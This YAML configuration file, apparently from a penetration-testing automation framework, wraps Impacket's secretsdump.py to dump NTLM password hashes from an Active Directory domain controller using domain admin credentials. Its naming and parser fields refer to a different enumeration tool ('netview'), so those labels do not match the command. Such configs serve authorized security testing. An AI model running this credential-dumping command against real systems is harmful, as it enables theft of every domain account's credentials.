tool author: "https://github.com/CoreSecurity"
config_creator: "huber"
tool_name: "secretsdump_netview"
simultaneous: True
group_by: "target"
targets:
      port_numbers: "389|88"
      protocol: "udp"
command: "sudo <pythonv2_path> <impacket_path>/examples/secretsdump.py -just-dc-ntlm <ad_domain>/<da_username>:<da_password>@<dc> -outputfile OUTPUT_FOLDER/netview.txt  -max-connections <secretsdump_max_connections> -delay <secretsdump_delay> <use_vss>"
output_path: "output/enumeration/netview/"
tool_parser: "parsers.enumeration.netview_parse.ad_computers"
check_already_run: True
create_folder: True

# Global Vars
impacket_path: '$PENTEST_DIR$/impacket/'

questions:
      - question: "Python v2 Path"
        name: "pythonv2_path"
        nullable: False
        regex: ""
        global: True
      - question: "Impacket Path"
        name: "impacket_path"
        nullable: False
        regex: ""
        global: True
      - question: "AD Domain"
        name: "ad_domain"
        nullable: False
        regex: ""
        global: False
      - question: "Domain Admin Username"
        name: "da_username"
        nullable: False
        regex: ""
        global: False
      - question: "Domain Admin Password"
        name: "da_password"
        nullable: False
        regex: ""
        global: False
      - question: "Domain Controller IP"
        name: "dc"
        nullable: False
        regex: ""
        global: False
      - question: "Max # of connections"
        name: "secretsdump_max_connections"
        nullable: True
        regex: ""
        global: False
        answers:
            default: 1000
            blank: 1000
      - question: "Delay (in seconds)"
        name: "secretsdump_delay"
        nullable: True
        regex: ""
        global: False
        answers:
            default: 10
            blank: 10
      - question: "Use vss (default False)"
        name: "use_vss"
        nullable: True
        regex: ^(?:Y|N)$
        global: False
        answers:
            Y: " -use-vss"
            N: ""
            blank: ""
            default: ""